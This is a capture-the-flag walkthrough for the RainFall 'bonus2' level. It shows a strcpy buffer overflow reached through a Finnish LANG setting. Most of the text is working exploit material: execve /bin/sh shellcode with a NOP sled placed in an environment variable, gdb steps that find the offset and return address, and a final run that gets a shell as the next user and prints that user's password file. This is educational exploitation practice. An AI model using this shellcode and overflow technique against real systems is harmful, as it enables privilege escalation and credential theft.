# Walkthrough

## Solution

```
export LANG=`python -c "print('fi' + '\x90' * 100 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"`

./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 18 + '\xab\xfe\xff\xbf'")
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## Explanation

### Execution

```
bonus2@RainFall:~$ ./bonus2 
bonus2@RainFall:~$ ./bonus2 hello
bonus2@RainFall:~$ ./bonus2 hello you
Hello hello
bonus2@RainFall:~$ ./bonus2 hello you bonjour
bonus2@RainFall:~$ ./bonus2 hello bonjour
Hello hello
bonus2@RainFall:~$ ./bonus2 bon jour
Hello bon
```  
-> The program seems to take 2 args, concatenate Hello with argv[1].

### Disassembly

```
info var
0x08049988  language

info function
0x08048484  greetuser
0x08048529  main
```  

You can view the commented asm code [here](Ressources/assembly.asm)  
You can view the asm code translated to C [here](source.c)  

#### Steps

- Find overflow offset of strcpy:  
--> with LANG="**en**"  
```
(gdb) run $(python -c "print '\x90' * 40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/bonus2/bonus2 0123456789012345678901234567890123456789 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5A
Hello 0123456789012345678901234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? ()
```
-> no offset found  

--> with LANG="**fi**"  
```
(gdb) run $(python -c "print '\x90' * 40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/bonus2/bonus2 0123456789012345678901234567890123456789 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Hyvää päivää 0123456789012345678901234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
```  
--> **offset is at 18**  
> We can use LANG="fi" to overflow strcpy:

- Export our payload to the LANG env variable  
```
export LANG=`python -c "print('fi' + '\x90' * 100 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"`
```  
- Find the LANG env variable address  
```
(gdb) break main
(gdb) run
(gdb) x/s *((char **)environ+11) (to find the LANG address)
0xbffffe9b:	 "LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f\315\200\061\333\211\330@\315\200\350\334\377\377\377/bin/sh"
```  

- Take an address with a NOP, so that it will slide into the shellcode  
```
(gdb) x/16wx 0xbffffe9b
0xbffffe9b:	0x474e414c	0x9069663d	0x90909090	0x90909090
0xbffffeab:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffebb:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffecb:	0x90909090	0x90909090	0x90909090	0x90909090
```  
--> let's take 0xbffffeab  

- **Final command**  
```
bonus2@RainFall:~$ ./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 18 + '\xab\xfe\xff\xbf'")
Hyvää päivää ��������������������������������������������������������������
$ pwd
/home/user/bonus2
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
